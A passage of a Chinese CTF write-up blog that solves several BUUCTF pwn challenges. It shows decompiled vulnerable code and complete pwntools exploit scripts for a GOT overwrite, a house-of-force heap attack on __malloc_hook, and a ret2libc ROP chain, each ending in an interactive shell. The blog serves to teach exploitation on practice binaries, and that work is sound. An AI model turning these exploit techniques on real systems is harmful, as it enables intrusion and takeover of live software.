class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'give me shellcode, plz:'</span><span class="token punctuation">,</span> <span class="token string">b'\x6a\x00\x5f'</span> <span class="token operator">+</span> shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wustctf2020-name-your-dog"><a href="#wustctf2020-name-your-dog" class="headerlink" title="wustctf2020_name_your_dog"></a><a href="https://buuoj.cn/challenges#wustctf2020_name_your_dog">wustctf2020_name_your_dog</a></h2><p><code>32</code>位的栈题，没开地址随机化</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wustctf2020_name_your_dog  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/wustctf2020_name_your_dog/pwn'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析题目，主要就两个函数，<code>vulnerable</code>调用了<code>Namewhich</code>函数，传入的参数是<code>bss</code>段的变量，题目中还存在后门函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I bought you five male dogs.Name for them?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v2 <span class="token operator">=</span> <span class="token function">NameWhich</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>Dogs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You get %d dogs!!!!!!\nWhatever , the author prefers cats ^.^\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"His name is:%s\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> <span class="token number">0x804A060</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">NameWhich</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-10h] BYREF</span>  v2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name for which?\n>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give your name plz: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%7s"</span><span class="token punctuation">,</span> <span class="token number">8</span> <span class="token operator">*</span> v2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在选择输入哪个的时候并没有限制输入值在<code>1-5</code>，所以直接去覆盖<code>scanf</code>的<code>got</code>表到后面函数地址即可</p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27510</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>dog <span class="token operator">=</span> <span class="token number">0x804A060</span>shell <span class="token operator">=</span> <span class="token number">0x80485CB</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>choice <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">7</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Name for which?'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Give your name plz: '</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>shell<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a><a href="https://buuoj.cn/challenges#gyctf_2020_force">gyctf_2020_force</a></h2><p>这题难倒不是很难，但是太太太折磨人啦！！！</p><p>看到题目就想到堆里的<code>house_of_force</code>，利用<code>top chunk</code>攻击，条件是可以溢出到top_chunk、可以申请任意大小的堆块,将<code>top chunk</code>堆大小改成<code>-1</code>之后申请到所需地址即可实现任意地址写</p><p>本题相当于只有一个<code>add</code>函数，并且限制了输入大小<code>0x50</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-120h]</span>  __int64 size<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-118h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-110h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+118h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202080<span class="token punctuation">;</span> <span class="token operator">*</span>i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>i <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202080 <span class="token operator">></span> <span class="token number">39</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> nptr<span class="token punctuation">,</span> <span class="token number">0xFuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size <span class="token operator">=</span> <span class="token function">atol</span><span class="token punctuation">(</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span>i <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>i <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bin addr %p\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span>i<span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先就是要先泄露<code>libc</code>，题目中可以输出创建的堆的地址，当堆大小大于<code>0x20000</code>的时候就会通过<code>mmap</code>创建堆并且位置与<code>libc</code>之间的偏移固定，通过这一点就可以得到<code>libc</code>基址</p><p>接下来只要通过<code>top chunk</code>申请到<code>__malloc_hook</code>改为<code>ogg</code>即可，但是尝试了所有的<code>ogg</code>包括使用<code>one_gadget -l2</code>输出了更多的<code>ogg</code>依然不行</p><p>在网上看了别人的<code>wp</code>发现条件没满足的时候可以通过<code>realloc</code>来调整是的满足对<code>rsp</code>的要求，因为<code>realloc</code>中存在<code>sub rsp, 38h</code></p><p>所以本题的思路就是改<code>__malloc_hook</code>为<code>realloc + 0x10</code>，并且改<code>__realloc__hook</code>为<code>ogg</code></p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25442</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'2:puts'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'2:puts'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x200000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x200ff0</span>li<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>gadget <span class="token operator">=</span> <span class="token number">0x4526a</span> <span class="token operator">+</span> libc_baserealloc <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserealloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'2:puts'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>top_chunk <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x10</span>p <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>size <span class="token operator">=</span> realloc_hook <span class="token operator">-</span> top_chunk <span class="token operator">-</span> <span class="token number">0x20</span>add<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>realloc <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'2:puts'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="鹏城杯-2018-code"><a href="#鹏城杯-2018-code" class="headerlink" title="鹏城杯_2018_code"></a><a href="https://buuoj.cn/challenges#%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_code">鹏城杯_2018_code</a></h2><p>这是一个…81分的题…（你不说我还以为1分呢</p><p>感觉难点就在过一个判断，过了这个判断之后直接<code>ret2libc</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">angr_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x53CBEB035LL</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 angr_hash()&#123;  int v1; &#x2F;&#x2F; [rsp+10h] [rbp-10h]  int i; &#x2F;&#x2F; [rsp+14h] [rbp-Ch]  __int64 v3; &#x2F;&#x2F; [rsp+18h] [rbp-8h]  v3 &#x3D; 0LL;  v1 &#x3D; strlen(str);  for ( i &#x3D; 0; i &lt; v1; ++i )    v3 &#x3D; (0x75 * v3 + str[i]) % 0x1D5E0C579E0LL;  return v3;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对<code>str</code>也有一个<code>check</code>，总的来说就是字母就行</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">check_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>  v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v1<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">90</span> <span class="token operator">&amp;&amp;</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">96</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">122</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我也不知道怎么计算快捷一点，我直接试了一堆数把答案凑出来的…</p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29398</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please input your name:'</span><span class="token punctuation">,</span> <span class="token string">b'wyBTs'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400983</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>have_fun <span class="token operator">=</span> <span class="token number">0x400801</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>have_fun<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please input your code to save'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>ogg <span class="token 